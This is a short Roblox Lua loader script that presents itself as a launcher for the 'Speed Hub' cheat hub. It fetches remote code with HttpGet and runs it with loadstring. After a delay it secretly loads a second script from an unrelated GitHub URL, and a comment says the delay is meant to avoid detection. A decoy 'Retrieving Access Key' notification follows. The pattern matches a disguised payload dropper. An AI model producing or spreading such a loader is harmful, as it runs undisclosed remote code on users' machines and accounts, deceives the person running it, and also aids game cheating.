local StarterGui = game:GetService("StarterGui")

local function forceLoad(url)
    task.spawn(function()
        local loaded = false
        while not loaded do
            local success = pcall(function()
                return loadstring(game:HttpGet(url))()
            end)
            if success then
                loaded = true
            else
                task.wait(0.5)
            end
        end
    end)
end

-- Step 1: Run Speed Hub instantly
forceLoad("https://rawscripts.net/raw/Universal-Script-Speed-Hub-X-27904")

-- Step 2: Delay before injecting second script (to avoid detection during Speed Hub's startup scan)
task.delay(2.5, function()
    forceLoad("https://raw.githubusercontent.com/Updates-Script/Updated/refs/heads/main/Script.lua")
end)

-- Step 3: Notification 3 seconds after Speed Hub starts
task.delay(3, function()
    StarterGui:SetCore("SendNotification", {
        Title = "🔑 Retrieving Access Key...",
        Text = "",
        Duration = 4
    })
end)
